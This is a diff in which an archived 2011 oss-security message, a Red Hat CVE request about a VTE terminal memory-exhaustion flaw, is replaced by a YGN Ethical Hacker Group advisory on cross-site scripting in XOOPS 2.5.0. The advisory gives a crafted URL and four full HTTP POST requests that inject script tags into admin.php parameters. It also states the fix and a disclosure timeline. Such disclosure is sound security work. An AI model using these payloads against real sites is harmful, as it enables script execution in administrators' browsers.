@@ -1,29 +1,153 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/09/3
-Message-ID: <4DF0E86E.9010908@redhat.com>
-Date: Thu, 09 Jun 2011 17:36:14 +0200
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: "Steven M. Christey" <coley@...us.mitre.org>
-CC: oss-security <oss-security@...ts.openwall.com>, vladz <vladz@...zero.fr>, Josselin Mouette <joss@...ian.org>, Behdad Esfahbod <behdad@...me.org>, Christian Persch <chpe@...me.org>, Josselin Mouette <joss@...sain.org>
-Subject: CVE Request -- vte -- Excessive memory and CPU use by processing certain character sequences
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/13
+Message-ID: <AANLkTi=0vH8dCVfx9T3OzBD29hiW+=Y2XJMD=_o_44+5@mail.gmail.com>
+Date: Fri, 18 Mar 2011 21:02:29 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-Hello, Josh, Steve, vendors,
+XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
 
-   An memory exhaustion flaw was found in the way VTE, a terminal
-emulator widget, processed certain character sequences. A remote
-attacker could provide a specially-crafted file, which once opened
-in a terminal using the VTE terminal emulator could lead to excessive
-memory and CPU consumption (leading to subsequent particular process
-termination by OOM killer on some systems).
 
-References:
-[1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=629688
-[2] https://bugzilla.gnome.org/show_bug.cgi?id=652124
-[3] https://bugzilla.redhat.com/show_bug.cgi?id=712148
 
-Could you allocate a CVE identifier for this?
+1. OVERVIEW
 
-Thank you & Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+The XOOPS 2.5.0 and lower versions were vulnerable to Cross Site Scripting.
+
+
+2. BACKGROUND
+
+XOOPS is an acronym of eXtensible Object Oriented Portal System. It's
+the #1 Content Management System (CMS) project on www.sourceforge.net
+and a recipient of several awards, and constantly places as finalist
+in various CMS and Open Source competitions. It incorporates many
+modules such as forums, photo galleries, calendars, article management
+etc.
+
+
+3. VULNERABILITY DESCRIPTION
+
+Several parameters such as module/module[], memberslist_id[],
+newname[], oldname[] were not properly sanitized upon submission to
+the /modules/system/admin.php url, which allows attacker to conduct
+Cross Site Scripting attack. This may allow an attacker to create a
+specially crafted URL that would execute arbitrary script code in a
+victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+XOOPS 2.5.0 and lower
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+Parameter: module
+
+http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin&op=install&module=pm%3Cimg%20src=a%20onerror=alert%28String.fromCharCode%2888,83,83%29%29%3Eaawe
+
+
+Parameter: module[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1"><script>alert(1)</script>&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+Parameter: memberslist_id[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=users&selgroups=2
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+memberslist_id%5b%5d="><script>alert(1)</script>&op=action_group&Submit=&selgroups=1&fct=mailusers&edit_group=add_group
+[/REQUEST]
+
+
+Parameter: newname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System"><script>alert(1)</script>
+[/REQUEST]
+
+
+Parameter: oldname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System"><script>alert(1)</script>1bf8581e3dc&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+6. SOLUTION
+
+Upgrade to XOOPS 2.5.1 or higher
+
+
+7. VENDOR
+
+XOOPS Development Team
+http://xoops.org
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-03-10: notified vendor
+2011-03-16: vendor released fixed version
+2011-03-18: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[xoops_2.5.0]_cross_site_scripting
+Vendor Announcement: http://xoops.org/modules/news/article.php?storyid=5851
+What XSS Can Do: http://yehg.net/lab/pr0js/view.php/What%20XSS%20Can%20Do.pdf
+XSS FAQs: http://www.cgisecurity.com/articles/xss-faq.shtml
+XSS (wiki): http://en.wikipedia.org/wiki/Cross-site_scripting
+XSS (owasp): http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+#yehg [2011-03-18]
